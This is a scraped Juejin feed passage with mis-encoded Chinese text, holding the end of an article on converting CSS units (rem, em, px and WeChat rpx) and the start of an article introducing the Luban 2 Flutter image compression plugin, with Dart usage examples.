<p>æµè§ˆå™¨æ ¹å…ƒç´ <code>ï¼ˆ&lt;html&gt;ï¼‰</code>çš„é»˜è®¤å­—ä½“å¤§å°çš„16pxã€‚</p>
<p>æ‰€ä»¥</p>
<pre><code class="hljs language-js" lang="js">1rem=16px
</code></pre>
<h6 data-id="heading-6">å¸¸è§æ¢ç®—</h6>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa57f34bf08d4cee91b904cdc24ed708~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCq5Y-v54ix55qE5Zyw55CD5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467693&amp;x-signature=6B4%2B9uOF2eOaMlkC2DsH6V4W%2FDg%3D" alt="image.png" loading="lazy"/></p>
<h6 data-id="heading-7">å¿«é€Ÿæ¢ç®—æ–¹æ³•</h6>
<pre><code class="hljs language-js" lang="js">rem å€¼ Ã— <span class="hljs-number">16</span> = px å€¼
</code></pre>
<p>æˆ–è€…</p>
<pre><code class="hljs language-js" lang="js">px å€¼ Ã· <span class="hljs-number">16</span> = rem å€¼
</code></pre>
<h6 data-id="heading-8">å®é™…åº”ç”¨</h6>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/* UnoCSS ç±»å */</span>
leading-<span class="hljs-number">5</span>        â†’ line-<span class="hljs-attr">height</span>: <span class="hljs-number">1.</span>25rem â†’ 20px
p-<span class="hljs-number">4</span>              â†’ <span class="hljs-attr">padding</span>: 1rem â†’ 16px
p-<span class="hljs-number">5</span>              â†’ <span class="hljs-attr">padding</span>: <span class="hljs-number">1.</span>25rem â†’ 20px
w-<span class="hljs-number">10</span>             â†’ <span class="hljs-attr">width</span>: <span class="hljs-number">2.</span>5rem â†’ 40px
</code></pre>
<h6 data-id="heading-9">å¦‚æœæ ¹å…ƒç´ å­—ä½“å¤§å°è¢«æ”¹äº†</h6>
<pre><code class="hljs language-js" lang="js">html {
  font-<span class="hljs-attr">size</span>: 20px;  <span class="hljs-comment">/* ä¸æ˜¯é»˜è®¤çš„ 16px */</span>
}
</code></pre>
<p>é‚£ä¹ˆ</p>
<pre><code class="hljs language-js" lang="js">1rem = 20px
<span class="hljs-number">1.</span>25rem = <span class="hljs-number">1.25</span> Ã— <span class="hljs-number">20</span> = 25px  (ä¸æ˜¯ 20px äº†)
</code></pre>
<h3 data-id="heading-10">ä¸‰ç§å•ä½çš„åŒºåˆ«ï¼š</h3>
<ol>
<li>px(åƒç´ )-ç»å¯¹å•ä½</li>
</ol>
<pre><code class="hljs language-js" lang="js">px = å›ºå®šåƒç´ å€¼ï¼Œä¸ä¼šå˜åŒ–
</code></pre>
<ol start="2">
<li>emï¼ˆç›¸å¯¹çˆ¶å…ƒç´ ï¼‰</li>
</ol>
<pre><code class="hljs language-js" lang="js">em Ã— çˆ¶å…ƒç´ å­—ä½“å¤§å° = px
</code></pre>
<ol start="3">
<li>remï¼ˆRoot Emï¼‰- ç›¸å¯¹æ ¹å…ƒç´ </li>
</ol>
<pre><code class="hljs language-js" lang="js">rem = ç›¸å¯¹äºæ ¹å…ƒç´ ï¼ˆ&lt;html&gt;ï¼‰çš„å­—ä½“å¤§å°
</code></pre>
<h2 data-id="heading-11">äºŒã€åœ¨å°ç¨‹åºä¸­æ¢ç®—</h2>
<p>rpxï¼ˆresponsive pixelï¼‰æ˜¯å¾®ä¿¡å°ç¨‹åºçš„å“åº”å¼å•ä½ï¼Œä¸æ˜¯æ ‡å‡†csså•ä½ã€‚</p>
<h6 data-id="heading-12">è§„åˆ™ï¼š</h6>
<pre><code class="hljs language-js" lang="js">å±å¹•å®½åº¦ = 750rpx
</code></pre>
<h6 data-id="heading-13">æ¢ç®—å…¬å¼ï¼š</h6>
<pre><code class="hljs language-js" lang="js">1rpx = å±å¹•å®½åº¦ Ã· <span class="hljs-number">750</span>
</code></pre>
<p>åè¿‡æ¥</p>
<pre><code class="hljs language-js" lang="js">1px = <span class="hljs-number">750</span> Ã· å±å¹•å®½åº¦ rpx
</code></pre>
<h4 data-id="heading-14">ä¸åŒè®¾å¤‡çš„æ¢ç®—</h4>
<h6 data-id="heading-15">iphone6ï¼ˆåŸºç¡€è®¾å¤‡ï¼‰</h6>
<pre><code class="hljs language-js" lang="js">å±å¹•å®½åº¦ï¼š375px
1rpx = 375px Ã· <span class="hljs-number">750</span> = <span class="hljs-number">0.</span>5px
1px = 2rpx
</code></pre>
<h6 data-id="heading-16">iPhone6 Plus</h6>
<pre><code class="hljs language-js" lang="js">å±å¹•å®½åº¦ï¼š414px
1rpx = 414px Ã· <span class="hljs-number">750</span> = <span class="hljs-number">0.</span>552px
1px â‰ˆ <span class="hljs-number">1.</span>81rpx
</code></pre>
<h6 data-id="heading-17">iPhone X</h6>
<pre><code class="hljs language-js" lang="js">å±å¹•å®½åº¦ï¼š375px
1rpx = 375px Ã· <span class="hljs-number">750</span> = <span class="hljs-number">0.</span>5px
1px = 2rpx
</code></pre>
<h6 data-id="heading-18">å¿«é€Ÿæ¢ç®—ï¼ˆä»¥iPhone6ä¸ºåŸºå‡†ï¼‰</h6>
<p>å¸¸ç”¨æ¢ç®—</p>
<pre><code class="hljs language-js" lang="js">1px = 2rpx
10px = 20rpx
20px = 40rpx
50px = 100rpx
100px = 200rpx
</code></pre>
<h3 data-id="heading-19">æ³¨æ„äº‹é¡¹</h3>
<h4 data-id="heading-20">1. rpx åªåœ¨å¾®ä¿¡å°ç¨‹åºä¸­ä½¿ç”¨</h4>
<ul>
<li>
<p>æ ‡å‡† CSS/HTML ä¸æ”¯æŒ rpx</p>
</li>
<li>
<p>UnoCSS ä¸æ”¯æŒ rpx</p>
</li>
<li>
<p>åªåœ¨å¾®ä¿¡å°ç¨‹åºã€uni-appÂ ç­‰æ¡†æ¶ä¸­ä½¿ç”¨</p>
</li>
</ul>
<h4 data-id="heading-21">2. ä¸åŒè®¾å¤‡æ¢ç®—ä¸åŒ</h4>
<ul>
<li>
<p>iPhone6ï¼š1px = 2rpx</p>
</li>
<li>
<p>iPhone6 Plusï¼š1px â‰ˆ 1.81rpx</p>
</li>
<li>
<p>å®‰å“ï¼š1px â‰ˆ 2.08rpx</p>
</li>
<li>
<p>è®¾è®¡ç¨¿å®½åº¦ç”¨Â 750px</p>
</li>
<li>
<p>è®¾è®¡ç¨¿ä¸­çš„ px å€¼ç›´æ¥ä½œä¸º rpx å€¼ä½¿ç”¨</p>
</li>
<li>
<p>ä¾‹å¦‚ï¼šè®¾è®¡ç¨¿ 100px â†’ ä»£ç  100rpx</p>
</li>
</ul>
<h6 data-id="heading-22">å®é™…å¼€å‘ä¸­çš„è¯ï¼Œå°ç¨‹åºä»¥iphone6/7/8ä¸ºåŸºå‡†è®¾å¤‡ã€‚</h6>
<pre><code class="hljs language-js" lang="js">iPhone6/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>
å±å¹•å®½åº¦ï¼š375px
å±å¹•é«˜åº¦ï¼š667px
</code></pre>
<h4 data-id="heading-23">è®¾è®¡ç¨¿æ ‡å‡†</h4>
<pre><code class="hljs language-js" lang="js">è®¾è®¡ç¨¿å®½åº¦ï¼š750pxï¼ˆ<span class="hljs-number">2</span>å€å›¾ï¼‰
è®¾è®¡ç¨¿é«˜åº¦ï¼š1334pxï¼ˆ<span class="hljs-number">2</span>å€å›¾ï¼‰
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Luban 2 Flutterï¼šä¸€è¡Œä»£ç åœ¨ Flutter å¼€å‘ä¸­å®ç°å›¾ç‰‡å‹ç¼©åŠŸèƒ½]]></title>    <link>https://juejin.cn/post/7592765004807667763</link>    <guid>https://juejin.cn/post/7592765004807667763</guid>    <pubDate>2026-01-08T08:56:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592765004807667763" data-draft-id="7592816646869925897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Luban 2 Flutterï¼šä¸€è¡Œä»£ç åœ¨ Flutter å¼€å‘ä¸­å®ç°å›¾ç‰‡å‹ç¼©åŠŸèƒ½"/> <meta itemprop="keywords" content="Flutter,iOS"/> <meta itemprop="datePublished" content="2026-01-08T08:56:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°ç†Šç åŒ "/> <meta itemprop="url" content="https://juejin.cn/user/1585942854909582"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Luban 2 Flutterï¼šä¸€è¡Œä»£ç åœ¨ Flutter å¼€å‘ä¸­å®ç°å›¾ç‰‡å‹ç¼©åŠŸèƒ½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1585942854909582/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°ç†Šç åŒ 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:56:59.000Z" title="Thu Jan 08 2026 08:56:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Luban 2 Flutter â€”â€” é«˜æ•ˆç®€æ´çš„ Flutter å›¾ç‰‡å‹ç¼©æ’ä»¶ï¼Œåƒç´ çº§è¿˜åŸå¾®ä¿¡æœ‹å‹åœˆå‹ç¼©ç­–ç•¥ã€‚</p>
<h2 data-id="heading-0">ğŸ“‘ ç›®å½•</h2>
<ul>
<li><a href="#-%E9%A1%B9%E7%9B%AE%E6%8F%8F%E8%BF%B0" title="#-%E9%A1%B9%E7%9B%AE%E6%8F%8F%E8%BF%B0">ğŸ“– é¡¹ç›®æè¿°</a></li>
<li><a href="#-%E7%89%B9%E6%80%A7" title="#-%E7%89%B9%E6%80%A7">âœ¨ ç‰¹æ€§</a></li>
<li><a href="#-%E6%95%88%E6%9E%9C%E4%B8%8E%E5%AF%B9%E6%AF%94" title="#-%E6%95%88%E6%9E%9C%E4%B8%8E%E5%AF%B9%E6%AF%94">ğŸ“Š æ•ˆæœä¸å¯¹æ¯”</a>
<ul>
<li><a href="#-%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95%E7%89%B9%E6%80%A7" title="#-%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95%E7%89%B9%E6%80%A7">ğŸ”¬ æ ¸å¿ƒç®—æ³•ç‰¹æ€§</a></li>
</ul>
</li>
<li><a href="#-%E5%AE%89%E8%A3%85" title="#-%E5%AE%89%E8%A3%85">ğŸ“¦ å®‰è£…</a></li>
<li><a href="#-%E4%BD%BF%E7%94%A8" title="#-%E4%BD%BF%E7%94%A8">ğŸ’» ä½¿ç”¨</a>
<ul>
<li><a href="#%E5%8E%8B%E7%BC%A9%E5%8D%95%E5%BC%A0%E5%9B%BE%E7%89%87" title="#%E5%8E%8B%E7%BC%A9%E5%8D%95%E5%BC%A0%E5%9B%BE%E7%89%87">å‹ç¼©å•å¼ å›¾ç‰‡</a></li>
<li><a href="#%E6%89%B9%E9%87%8F%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87" title="#%E6%89%B9%E9%87%8F%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87">æ‰¹é‡å‹ç¼©å›¾ç‰‡</a></li>
</ul>
</li>
<li><a href="#-%E6%8D%90%E5%8A%A9" title="#-%E6%8D%90%E5%8A%A9">â˜• æåŠ©</a></li>
<li><a href="#-license" title="#-license">ğŸ“„ License</a></li>
</ul>
<h2 data-id="heading-1">ğŸ“– é¡¹ç›®æè¿°</h2>
<p>å¼€æºåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fcurzbin%2Fflutter_luban" target="_blank" title="https://gitee.com/curzbin/flutter_luban" ref="nofollow noopener noreferrer">Gitee</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCurzibn%2Fflutter_luban" target="_blank" title="https://github.com/Curzibn/flutter_luban" ref="nofollow noopener noreferrer">Github</a></p>
<p>ç›®å‰åš <code>App</code> å¼€å‘æ€»ç»•ä¸å¼€å›¾ç‰‡è¿™ä¸ªå…ƒç´ ã€‚ä½†æ˜¯éšç€æ‰‹æœºæ‹ç…§åˆ†è¾¨ç‡çš„æå‡ï¼Œå›¾ç‰‡çš„å‹ç¼©æˆä¸ºä¸€ä¸ªå¾ˆé‡è¦çš„é—®é¢˜ã€‚å•çº¯å¯¹å›¾ç‰‡è¿›è¡Œè£åˆ‡ï¼Œå‹ç¼©å·²ç»æœ‰å¾ˆå¤šæ–‡ç« ä»‹ç»ã€‚ä½†æ˜¯è£åˆ‡æˆå¤šå°‘ï¼Œå‹ç¼©æˆå¤šå°‘å´å¾ˆéš¾æ§åˆ¶å¥½ï¼Œè£åˆ‡è¿‡å¤´å›¾ç‰‡å¤ªå°ï¼Œè´¨é‡å‹ç¼©è¿‡å¤´åˆ™æ˜¾ç¤ºæ•ˆæœå¤ªå·®ã€‚</p>
<p>äºæ˜¯è‡ªç„¶æƒ³åˆ° <code>App</code> å·¨å¤´"å¾®ä¿¡"ä¼šæ˜¯æ€ä¹ˆå¤„ç†ï¼Œ<code>Luban</code>ï¼ˆé²ç­ï¼‰å°±æ˜¯é€šè¿‡åœ¨å¾®ä¿¡æœ‹å‹åœˆå‘é€è¿‘100å¼ ä¸åŒåˆ†è¾¨ç‡å›¾ç‰‡ï¼Œå¯¹æ¯”åŸå›¾ä¸å¾®ä¿¡å‹ç¼©åçš„å›¾ç‰‡é€†å‘æ¨ç®—å‡ºæ¥çš„å‹ç¼©ç®—æ³•ã€‚</p>
<p>å› ä¸ºæ˜¯é€†å‘æ¨ç®—ï¼Œæ•ˆæœè¿˜æ²¡æ³•è·Ÿå¾®ä¿¡ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯å·²ç»å¾ˆæ¥è¿‘å¾®ä¿¡æœ‹å‹åœˆå‹ç¼©åçš„æ•ˆæœï¼Œå…·ä½“çœ‹ä»¥ä¸‹å¯¹æ¯”ï¼</p>
<p>æœ¬åº“æ˜¯ <code>Luban</code> çš„ <strong>Flutter ç‰ˆæœ¬</strong>ï¼Œä½¿ç”¨ <strong>TurboJPEG</strong> è¿›è¡Œé«˜æ€§èƒ½å›¾ç‰‡å‹ç¼©ï¼Œæä¾›ç®€æ´æ˜“ç”¨çš„ API å’Œæ¥è¿‘å¾®ä¿¡æœ‹å‹åœˆçš„å‹ç¼©æ•ˆæœã€‚</p>
<h2 data-id="heading-2">ğŸ“Š æ•ˆæœä¸å¯¹æ¯”</h2>















































<table><thead><tr><th align="left">å›¾ç‰‡ç±»å‹</th><th align="left">åŸå›¾ï¼ˆåˆ†è¾¨ç‡, å¤§å°ï¼‰</th><th align="left">Lubanï¼ˆåˆ†è¾¨ç‡, å¤§å°ï¼‰</th><th align="left">Wechatï¼ˆåˆ†è¾¨ç‡, å¤§å°ï¼‰</th></tr></thead><tbody><tr><td align="left"><strong>æ ‡å‡†æ‹ç…§</strong></td><td align="left">3024Ã—4032, 5.10MB</td><td align="left">1440Ã—1920, 305KB</td><td align="left">1440Ã—1920, 303KB</td></tr><tr><td align="left"><strong>é«˜æ¸…å¤§å›¾</strong></td><td align="left">4000Ã—6000, 12.10MB</td><td align="left">1440Ã—2160, 318KB</td><td align="left">1440Ã—2160, 305KB</td></tr><tr><td align="left"><strong>2K æˆªå›¾</strong></td><td align="left">1440Ã—3200, 2.10MB</td><td align="left">1440Ã—3200, 148KB</td><td align="left">1440Ã—3200, 256KB</td></tr><tr><td align="left"><strong>è¶…é•¿è®°å½•</strong></td><td align="left">1242Ã—22080, 6.10MB</td><td align="left">758Ã—13490, 290KB</td><td align="left">744Ã—13129, 256KB</td></tr><tr><td align="left"><strong>å…¨æ™¯æ¨ªå›¾</strong></td><td align="left">12000Ã—5000, 8.10MB</td><td align="left">1440Ã—600, 126KB</td><td align="left">1440Ã—600, 123KB</td></tr><tr><td align="left"><strong>è®¾è®¡åŸç¨¿</strong></td><td align="left">6000Ã—6000, 6.90MB</td><td align="left">1440Ã—1440, 263KB</td><td align="left">1440Ã—1440, 279KB</td></tr></tbody></table>
<h2 data-id="heading-3">ğŸ”¬ æ ¸å¿ƒç®—æ³•ç‰¹æ€§</h2>
<p>æœ¬åº“é‡‡ç”¨<strong>è‡ªé€‚åº”ç»Ÿä¸€å›¾åƒå‹ç¼©ç®—æ³• (Adaptive Unified Image Compression)</strong>ï¼Œé€šè¿‡åŸå›¾çš„åˆ†è¾¨ç‡ç‰¹å¾ï¼ŒåŠ¨æ€åº”ç”¨å·®å¼‚åŒ–ç­–ç•¥ï¼Œå®ç°ç”»è´¨ä¸ä½“ç§¯çš„æœ€ä¼˜å¹³è¡¡ã€‚</p>
<h3 data-id="heading-4">æ™ºèƒ½åˆ†è¾¨ç‡å†³ç­–</h3>
<ul>
<li><strong>é«˜æ¸…åŸºå‡† (1440p)</strong>ï¼šé»˜è®¤ä»¥ 1440px ä½œä¸ºçŸ­è¾¹åŸºå‡†ï¼Œç¡®ä¿åœ¨ç°ä»£ 2K/4K å±å¹•ä¸Šçš„è§†è§‰æ¸…æ™°åº¦</li>
<li><strong>å…¨æ™¯å¢™ç­–ç•¥</strong>ï¼šè‡ªåŠ¨è¯†åˆ«è¶…å¤§å…¨æ™¯å›¾ï¼ˆé•¿è¾¹ &gt;10800pxï¼‰ï¼Œé”å®šé•¿è¾¹ä¸º 1440pxï¼Œä¿ç•™å®Œæ•´è§†é‡</li>
<li><strong>è¶…å¤§åƒç´ é™·é˜±</strong>ï¼šå¯¹è¶…è¿‡ 4096ä¸‡åƒç´ çš„è¶…é«˜åƒç´ å›¾è‡ªåŠ¨æ‰§è¡Œ 1/4 é™é‡‡æ ·å¤„ç†</li>
<li><strong>é•¿å›¾å†…å­˜ä¿æŠ¤</strong>ï¼šé’ˆå¯¹è¶…é•¿æˆªå›¾å»ºç«‹ 10.24MP åƒç´ ä¸Šé™ï¼Œé€šè¿‡ç­‰æ¯”ç¼©æ”¾é˜²æ­¢ OOM</li>
</ul>
<h3 data-id="heading-5">è‡ªé€‚åº”æ¯”ç‰¹ç‡æ§åˆ¶</h3>
<ul>
<li><strong>æå°å›¾ (&lt;0.5MP)</strong>ï¼šå‡ ä¹ä¸è¿›è¡Œæœ‰æŸå‹ç¼©ï¼Œé˜²æ­¢å‹ç¼©ä¼ªå½±</li>
<li><strong>é«˜é¢‘ä¿¡æ¯å›¾ (0.5-1MP)</strong>ï¼šæé«˜ç¼–ç è´¨é‡ï¼Œè¡¥å¿åˆ†è¾¨ç‡æŸå¤±</li>
<li><strong>æ ‡å‡†å›¾ç‰‡ (1-3MP)</strong>ï¼šåº”ç”¨å¹³è¡¡ç³»æ•°ï¼Œå¯¹æ ‡ä¸»æµç¤¾äº¤è½¯ä»¶ä½“éªŒ</li>
<li><strong>è¶…å¤§å›¾/é•¿å›¾ (&gt;3MP)</strong>ï¼šåº”ç”¨é«˜å‹ç¼©ç‡ï¼Œæ˜¾è‘—å‡å°‘ä½“ç§¯</li>
</ul>
<h3 data-id="heading-6">å¥å£®æ€§ä¿éšœ</h3>
<ul>
<li><strong>è†¨èƒ€å›é€€</strong>ï¼šå‹ç¼©åä½“ç§¯å¤§äºåŸå›¾æ—¶ï¼Œè‡ªåŠ¨é€ä¼ åŸå›¾ï¼Œç¡®ä¿ç»ä¸"è´Ÿä¼˜åŒ–"</li>
<li><strong>è¾“å…¥é˜²å¾¡</strong>ï¼šå¦¥å–„å¤„ç†æç«¯åˆ†è¾¨ç‡è¾“å…¥ï¼ˆ0ã€è´Ÿæ•°ã€1px ç­‰ï¼‰ï¼Œé˜²æ­¢å´©æºƒ</li>
</ul>
<h2 data-id="heading-7">ğŸ“¦ å®‰è£…</h2>
<p>åœ¨ <code>pubspec.yaml</code> æ–‡ä»¶ä¸­æ·»åŠ ä¾èµ–ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">luban:</span> <span class="hljs-string">^2.0.1</span>
</code></pre>
<p>ç„¶åè¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">flutter pub get
</code></pre>
<h2 data-id="heading-8">ğŸ’» ä½¿ç”¨</h2>
<h3 data-id="heading-9">å‹ç¼©å•å¼ å›¾ç‰‡</h3>
<h4 data-id="heading-10">ä½¿ç”¨ File å¯¹è±¡</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> file = File(<span class="hljs-string">'/path/to/image.jpg'</span>);
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compress(file);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> compressionResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å®Œæˆ'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'åŸå›¾å¤§å°: <span class="hljs-subst">${compressionResult.originalSizeKb}</span> KB'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©åå¤§å°: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©ç‡: <span class="hljs-subst">${(compressionResult.compressionRatio * <span class="hljs-number">100</span>).toStringAsFixed(<span class="hljs-number">1</span>)}</span>%'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'è¾“å‡ºæ–‡ä»¶: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å¤±è´¥: <span class="hljs-subst">${result.error}</span>'</span>);
  }
}
</code></pre>
<h4 data-id="heading-11">ä½¿ç”¨å­—ç¬¦ä¸²è·¯å¾„</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressPath(<span class="hljs-string">'/path/to/image.jpg'</span>);
  
  result.fold(
    (error) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å¤±è´¥: <span class="hljs-subst">$error</span>'</span>),
    (compressionResult) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å®Œæˆï¼Œå¤§å°: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'è¾“å‡ºæ–‡ä»¶: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
    },
  );
}
</code></pre>
<h4 data-id="heading-12">æŒ‡å®šè¾“å‡ºæ–‡ä»¶</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> inputFile = File(<span class="hljs-string">'/path/to/image.jpg'</span>);
